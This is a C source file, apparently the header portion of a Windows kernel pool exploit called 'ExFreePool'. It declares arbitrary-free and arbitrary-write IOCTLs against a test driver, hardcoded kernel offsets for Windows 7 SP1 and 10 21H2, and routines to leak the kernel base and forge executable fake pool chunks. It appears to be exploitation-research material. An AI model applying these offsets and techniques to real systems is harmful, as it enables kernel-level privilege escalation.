#include <Windows.h>
#include <stdio.h>
#include <versionhelpers.h>

#include "nt_query_structs.h"

#include "pool_enums.h"
#include "pool_main_structs_7_SP1_x64.h"
#include "pool_main_structs_21H2_x64.h"

#include "type_index_table.h"

#define BANNER \
("    ______     ______               ____              __\n" \
"   / ____/  __/ ____/_______  ___  / __ \\____  ____  / /\n" \
"  / __/ | |/_/ /_  / ___/ _ \\/ _ \\/ /_/ / __ \\/ __ \\/ / \n" \
" / /____>  </ __/ / /  /  __/  __/ ____/ /_/ / /_/ / /  \n" \
"/_____/_/|_/_/   /_/   \\___/\\___/_/    \\____/\\____/_/   \n" \
"                                                        \n" \
)

#define DEVICE "\\\\.\\ExFreePoolPrimitive"
#define IOCTL_ARBITRARY_POOL_FREE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ARBITRARY_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 1, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEAP_OBJECT_COUNT 16384

#define NT_OBTYPEINDEXTABLE_21H2_X64_OFFSET 0xCFCE80
#define NT_OBTYPEINDEXTABLE_7_SP1_X64_OFFSET 0x21F100

#define NONPAGED_POOL_DESCRIPTOR_7_SP1_X64_OFFSET 0x1FB880

#define NONPAGED_POOL_DESCRIPTOR_PENDINGFREES_7_SP1_X64_OFFSET 0x1FB880 + 0x100

// Windows 10 21H2 x64 VM3D Pool Tag
#define VM3D_POOL_TAG 0x44334D56

// Windows 7 SP1 x64 DxgK Pool Tag
#define DXGK_POOL_TAG 0x4B677844

int main(int argc, char** argv);

long long leak_ntoskrnl_base();

// Windows 10 21H2 x64 Utility Functions
void initialize_pool_header_w10_21H2(PPOOL_HEADER_W10_21H2 input_pool_header);
void initialize_object_header_quota_w10_21H2(POBJECT_HEADER_QUOTA_INFO_W10_21H2 input_object_header_quota);
void initialize_quad_w10_21H2(PQUAD_W10_21H2 input_quad);
void initialize_ex_push_lock_w10_21H2(PEX_PUSH_LOCK_W10_21H2 input_ex_push_lock);
void initialize_object_create_information_w10_21H2(POBJECT_CREATE_INFORMATION_W10_21H2 input_object_create_information);
void initialize_object_header_w10_21H2(POBJECT_HEADER_W10_21H2 input_object_header, PEX_PUSH_LOCK_W10_21H2 input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD_W10_21H2 input_quad, POBJECT_CREATE_INFORMATION_W10_21H2 input_object_create_information);
void initialize_main_pool_structs_w10_21H2(char* address, PPOOL_HEADER_W10_21H2 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W10_21H2 input_object_header_quota, PEX_PUSH_LOCK_W10_21H2 input_push_lock, PQUAD_W10_21H2 input_quad, POBJECT_CREATE_INFORMATION_W10_21H2 input_object_create_information, POBJECT_HEADER_W10_21H2 input_object_header);

int mark_pool_structs_executable_w10_21H2(PPOOL_HEADER_W10_21H2 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W10_21H2 input_object_header_quota, PEX_PUSH_LOCK_W10_21H2 input_push_lock, PQUAD_W10_21H2 input_quad, POBJECT_CREATE_INFORMATION_W10_21H2 input_object_create_information, POBJECT_HEADER_W10_21H2 input_object_header);
void build_pool_chunk_w10_21H2(char* fake_pool_memory_page, POOL_HEADER_W10_21H2 pool_header, OBJECT_HEADER_QUOTA_INFO_W10_21H2 object_header_quota_info, OBJECT_HEADER_W10_21H2 object_header);
// End.

// Windows 7 SP1 x64 Utility Functions
void initialize_pool_header_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header);
void initialize_object_header_quota_w7_SP1(POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota);
void initialize_object_header_w7_SP1(POBJECT_HEADER_W7_SP1 input_object_header);
void initialize_main_pool_structs_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, POBJECT_HEADER_W7_SP1 input_object_header);

int mark_pool_structs_executable_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, POBJECT_HEADER_W7_SP1 input_object_header);
void build_pool_chunk_w7_SP1(char* fake_pool_memory_page, POOL_HEADER_W7_SP1 pool_header, OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota_info, OBJECT_HEADER_W7_SP1 object_header);
// End.

void arbitrary_write(HANDLE h_driver, long long what, long long where);

int windows7_SP1();
int windows10_21H2();